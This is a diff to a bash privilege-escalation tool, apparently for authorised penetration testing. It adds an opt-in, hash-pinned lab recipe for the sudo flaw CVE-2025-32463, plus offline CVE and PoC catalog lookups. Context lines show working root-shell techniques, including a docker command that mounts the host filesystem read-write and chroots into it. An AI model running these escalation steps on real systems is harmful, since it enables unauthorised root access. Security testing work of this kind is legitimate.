@@ -14,11 +14,21 @@ TOOL_DIR=''
 MODE='auto'
 RESUME_ID=''
 NO_SHELL=0
+CATALOG_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/catalog"
+CVE_QUERY=''
+POC_QUERY=0
+LAB_CVE_ENABLED=0
+CVE_SUDO='/opt/edamame-vuln-sudo/bin/sudo'
+CVE_SUDO_SHA='8c18093b760250d35b1ebcc5ecd12b33d17b8a2cfc27f170bbb4f62b674702cd'
+CVE_POC_SHA='9826979c7a3cb1ca582862768d74245806051db5601c7b6a7e13bde93b8052d7'
 
 usage() {
   cat <<'EOF'
 Usage: edamame-ng.sh [--scan | --resume [RUN_ID]] [--output-dir DIR]
-                      [--tool-dir DIR] [--no-shell]
+                      [--tool-dir DIR] [--catalog-dir DIR] [--no-shell]
+                      [--enable-cve-2025-32463-lab]
+       edamame-ng.sh --cve CVE-YYYY-NNNN [--catalog-dir DIR]
+       edamame-ng.sh --poc CVE-YYYY-NNNN [--catalog-dir DIR]
 Run with no mode to choose Resume (default) or Scan when a prior success exists.
 --tool-dir accepts local assets only when each has an adjacent .sha256 file.
 EOF
@@ -30,19 +40,79 @@ while (($#)); do
     --resume) MODE=resume; shift; if (($#)) && [[ $1 != --* ]]; then RESUME_ID=$1; shift; fi ;;
     --output-dir) (($# >= 2)) || { usage >&2; exit 2; }; RUN_BASE=$2; shift 2 ;;
     --tool-dir) (($# >= 2)) || { usage >&2; exit 2; }; TOOL_DIR=$2; shift 2 ;;
+    --catalog-dir) (($# >= 2)) || { usage >&2; exit 2; }; CATALOG_DIR=$2; shift 2 ;;
+    --cve) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; shift 2 ;;
+    --poc) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; POC_QUERY=1; shift 2 ;;
+    --enable-cve-2025-32463-lab) LAB_CVE_ENABLED=1; shift ;;
     --no-shell) NO_SHELL=1; shift ;;
     -h|--help) usage; exit 0 ;;
     *) usage >&2; exit 2 ;;
   esac
 done
+CVE_POC="$CATALOG_DIR/pocs/CVE-2025-32463/sudo-chwoot.sh"
 
 sha256_file() {
-  if command -v sha256sum >/dev/null 2>&1; then
-    sha256sum "$1" | awk '{print $1}'
-  else
-    shasum -a 256 "$1" | awk '{print $1}'
-  fi
+  local binary line digest
+  for binary in /usr/bin/sha256sum /bin/sha256sum; do
+    if [[ -x $binary ]]; then
+      line=$("$binary" "$1") || return 1
+      digest=${line%% *}
+      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
+      printf '%s\n' "$digest"
+      return 0
+    fi
+  done
+  for binary in /usr/bin/shasum /bin/shasum; do
+    if [[ -x $binary ]]; then
+      line=$("$binary" -a 256 "$1") || return 1
+      digest=${line%% *}
+      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
+      printf '%s\n' "$digest"
+      return 0
+    fi
+  done
+  return 1
 }
+
+trusted_root_file() {
+  local path=$1 mode
+  [[ $path == /* && -f $path ]] || return 1
+  while [[ $path != / ]]; do
+    [[ ! -L $path && $(/usr/bin/stat -c %u "$path" 2>/dev/null) == 0 ]] || return 1
+    mode=$(/usr/bin/stat -c %a "$path" 2>/dev/null) || return 1
+    [[ $mode =~ ^[0-7]+$ ]] || return 1
+    (( (8#$mode & 8#22) == 0 )) || return 1
+    path=${path%/*}
+    [[ -n $path ]] || path=/
+  done
+}
+
+if [[ -n $CVE_QUERY ]]; then
+  [[ $CVE_QUERY =~ ^CVE-[0-9]{4}-[0-9]{4,}$ ]] || { printf 'Invalid CVE ID.\n' >&2; exit 2; }
+  if ((POC_QUERY)); then
+    [[ -f $CATALOG_DIR/poc_refs.tsv ]] || { printf 'Offline PoC manifest unavailable.\n' >&2; exit 2; }
+    printf 'cve\tstatus\tsource\tpath\tsha256\treview_state\n'
+    poc_found=0
+    while IFS=$'\t' read -r id _kind source _commit relative digest _license state; do
+      [[ $id == "$CVE_QUERY" ]] || continue
+      poc_found=1
+      if [[ $relative == - ]]; then
+        printf '%s\treference-only\t%s\t\t\t%s\n' "$id" "$source" "$state"
+        continue
+      fi
+      [[ $relative =~ ^pocs/CVE-[0-9]{4}-[0-9]{4,}/[A-Za-z0-9._-]+$ && $relative == "pocs/$CVE_QUERY/"* && $digest =~ ^[0-9a-f]{64}$ ]] || { printf 'Invalid PoC manifest entry.\n' >&2; exit 2; }
+      asset="$CATALOG_DIR/$relative"
+      [[ -f $asset && ! -L $asset && $(sha256_file "$asset") == "$digest" ]] || { printf 'PoC asset missing or digest mismatch.\n' >&2; exit 2; }
+      printf '%s\tverified-bundle\t%s\t%s\t%s\t%s\n' "$id" "$source" "$asset" "$digest" "$state"
+    done < <(tail -n +2 "$CATALOG_DIR/poc_refs.tsv")
+    ((poc_found)) || printf '%s\tnot-indexed\t\t\t\t\n' "$CVE_QUERY"
+  else
+    [[ -f $CATALOG_DIR/local-eop.tsv ]] || { printf 'Offline catalog unavailable.\n' >&2; exit 2; }
+    printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n'
+    awk -F '\t' -v id="$CVE_QUERY" 'NR>1 && $1==id {print $1 "\tindexed-review-only\t" $2 "\t" $3 "\t" $4 "\t" $5; found=1} END {if (!found) print id "\tunindexed\t\t\t\thttps://www.cve.org/CVERecord?id=" id}' "$CATALOG_DIR/local-eop.tsv"
+  fi
+  exit 0
+fi
 
 safe_name() { [[ $1 =~ ^[A-Za-z0-9._+-]+$ && $1 != . && $1 != .. ]]; }
 host_name=$(hostname -s 2>/dev/null || hostname)
@@ -93,9 +163,13 @@ if [[ $MODE == resume ]]; then
   IFS=$'\t' read -r saved_host recipe _ < "$success_file"
   [[ $saved_host == "$host_name" ]] || { printf 'Saved run belongs to another host.\n' >&2; exit 2; }
   case $recipe in
-    already-root|sudo-shell|suid-bash|python-cap-setuid|docker-host-root) ;;
+    already-root|sudo-shell|suid-bash|python-cap-setuid|docker-host-root|cve-2025-32463-lab) ;;
     *) printf 'Unknown saved recipe.\n' >&2; exit 2 ;;
   esac
+  if [[ $recipe == cve-2025-32463-lab ]] && (( ! LAB_CVE_ENABLED )); then
+    printf 'Saved CVE recipe requires --enable-cve-2025-32463-lab.\n' >&2
+    exit 2
+  fi
   printf '[RESUME] %s on %s; checking prerequisites again.\n' "$recipe" "$host_name"
   RUN_DIR=${success_file%/success.tsv}
 else
@@ -188,7 +262,7 @@ asset_from_release() {
 }
 
 verify_recipe() {
-  local recipe=$1 py caps image
+  local recipe=$1 py caps image probe version cve_dir
   case $recipe in
     already-root) [[ $(id -u) == 0 ]] ;;
     sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$(id -u)" = 0' >/dev/null 2>&1 ;;
@@ -207,6 +281,19 @@ verify_recipe() {
       image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
       [[ -n $image ]] || return 1
       timeout 30 docker run --rm --pull never --network none --entrypoint /bin/sh -v /:/host:ro "$image" -c 'chroot /host /bin/sh -c "test \"\$(id -u)\" = 0"' >/dev/null 2>&1
+      ;;
+    cve-2025-32463-lab)
+      ((LAB_CVE_ENABLED)) || return 1
+      [[ -x /usr/bin/stat && -x /usr/bin/timeout && -x /usr/bin/gcc ]] || return 1
+      cve_dir=${CVE_SUDO%/*}
+      trusted_root_file "$CVE_SUDO" && [[ -u $CVE_SUDO ]] || return 1
+      trusted_root_file "$CVE_POC" || return 1
+      [[ $(sha256_file "$CVE_SUDO") == "$CVE_SUDO_SHA" ]] || return 1
+      version=$("$CVE_SUDO" -V 2>/dev/null) || return 1
+      [[ ${version%%$'\n'*} == 'Sudo version 1.9.16p2' ]] || return 1
+      [[ $(sha256_file "$CVE_POC") == "$CVE_POC_SHA" ]] || return 1
+      probe=$(PATH="$cve_dir:/usr/sbin:/usr/bin:/sbin:/bin" /usr/bin/timeout 30 /bin/bash "$CVE_POC" --probe 2>&1) || return 1
+      printf '%s\n' "$probe" | /usr/bin/grep -qx '0'
       ;;
     *) return 1 ;;
   esac
@@ -232,6 +319,9 @@ open_shell() {
       image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
       docker run --rm -it --pull never --network none --entrypoint /bin/sh -v /:/host:rw "$image" -c 'chroot /host /bin/bash -i'
       ;;
+    cve-2025-32463-lab)
+      PATH="${CVE_SUDO%/*}:/usr/sbin:/usr/bin:/sbin:/bin" /bin/bash "$CVE_POC" --shell
+      ;;
   esac
 }
 
@@ -246,7 +336,11 @@ if [[ $MODE == resume ]]; then
   exit 1
 fi
 
-printf '[ENUM] Fetching official current release assets.\n'
+if [[ -n $TOOL_DIR ]]; then
+  printf '[ENUM] Loading verified local assets.\n'
+else
+  printf '[ENUM] Fetching official current release assets.\n'
+fi
 linpeas="$RUN_DIR/.capture/linpeas.sh"
 lse="$RUN_DIR/.capture/lse.sh"
 have_linpeas=0; have_lse=0
@@ -304,7 +398,9 @@ if [[ -s $cve_tmp ]]; then
 fi
 
 selected=''
-for candidate in already-root sudo-shell suid-bash python-cap-setuid docker-host-root; do
+candidates=(already-root sudo-shell suid-bash python-cap-setuid docker-host-root)
+if ((LAB_CVE_ENABLED)); then candidates+=(cve-2025-32463-lab); fi
+for candidate in "${candidates[@]}"; do
   if verify_recipe "$candidate"; then
     selected=$candidate
     record_finding local-escalation "$candidate independently verified"
@@ -313,6 +409,13 @@ for candidate in already-root sudo-shell suid-bash python-cap-setuid docker-host
   fi
   record_attempt "$candidate" prerequisite-not-met
 done
+if [[ $selected == cve-2025-32463-lab ]]; then
+  printf 'CVE-2025-32463 tested lab build\tchecked\texact sudo and PoC digests plus UID 0 probe\n' >> "$RUN_DIR/coverage.tsv"
+elif (( ! LAB_CVE_ENABLED )); then
+  printf 'CVE-2025-32463 tested lab build\tunsupported\texplicit lab opt-in not supplied\n' >> "$RUN_DIR/coverage.tsv"
+else
+  printf 'CVE-2025-32463 tested lab build\tinapplicable\texact reviewed build not detected\n' >> "$RUN_DIR/coverage.tsv"
+fi
 enum_status=unsupported
 if ((linpeas_complete && lse_complete)); then enum_status=checked; fi
 while IFS='|' read -r area basis; do
@@ -350,6 +453,7 @@ Automated Privilege Escalation Tools|LinPEAS and LSE
 EOF
 # shellcheck disable=SC1112 # Preserve the checklist heading verbatim.
 printf 'Dump clear PSK keys from the Network Manager if available.\tunsupported\tno cleartext value extraction\nCheck for tasks that are run as root and are world writeable.\tunsupported\timpactful change needs a reviewed recipe\nRev Shell’s\tinapplicable\ttool opens a local shell\nRed Teaming Toolkit\tunsupported\ttool-specific checklist entry\nBeRoot\tunsupported\ttool-specific checklist entry\n' >> "$RUN_DIR/coverage.tsv"
+printf 'CVE build and patch applicability\tunsupported\toffline index is a review lead, not a vulnerable-build test\n' >> "$RUN_DIR/coverage.tsv"
 
 # The visible alerts above precede these final output filenames.
 for label in linpeas lse; do
@@ -361,10 +465,23 @@ done
 while IFS= read -r cve; do
   [[ -n $cve ]] && printf '%s\thttps://www.cve.org/CVERecord?id=%s\n' "$cve" "$cve"
 done < "$cve_tmp" > "$RUN_DIR/cve-candidates.tsv"
+printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n' > "$RUN_DIR/cve-index.tsv"
+if [[ -f $CATALOG_DIR/local-eop.tsv ]]; then
+  awk -F '\t' 'NR==FNR {if (FNR>1) {record[$1]=$0; platform[$1]=$2}; next}
+    NF {if ($1 in record) {split(record[$1], fields, "\t"); status=(platform[$1]=="linux" ? "indexed-review-only" : "platform-mismatch"); print $1 "\t" status "\t" fields[2] "\t" fields[3] "\t" fields[4] "\t" fields[5]}
+    else print $1 "\tunindexed\t\t\t\thttps://www.cve.org/CVERecord?id=" $1}' "$CATALOG_DIR/local-eop.tsv" "$cve_tmp" >> "$RUN_DIR/cve-index.tsv"
+else
+  printf '[WARN] Offline CVE catalog unavailable; retaining CVE.org links.\n' >&2
+  awk '{print $1 "\tunindexed\t\t\t\thttps://www.cve.org/CVERecord?id=" $1}' "$cve_tmp" >> "$RUN_DIR/cve-index.tsv"
+fi
 printf '[SAVED] findings.tsv, coverage.tsv, attempts.tsv, tools.tsv\n'
 
 if [[ -n $selected ]]; then
-  printf '%s\t%s\tverified-local-proof\n' "$host_name" "$selected" > "$RUN_DIR/success.tsv"
+  evidence='verified-local-proof'
+  if [[ $selected == cve-2025-32463-lab ]]; then
+    evidence="uid0-probe,sudo-sha256:$CVE_SUDO_SHA,poc-sha256:$CVE_POC_SHA"
+  fi
+  printf '%s\t%s\t%s\n' "$host_name" "$selected" "$evidence" > "$RUN_DIR/success.tsv"
   open_shell "$selected"
   exit 0
 fi
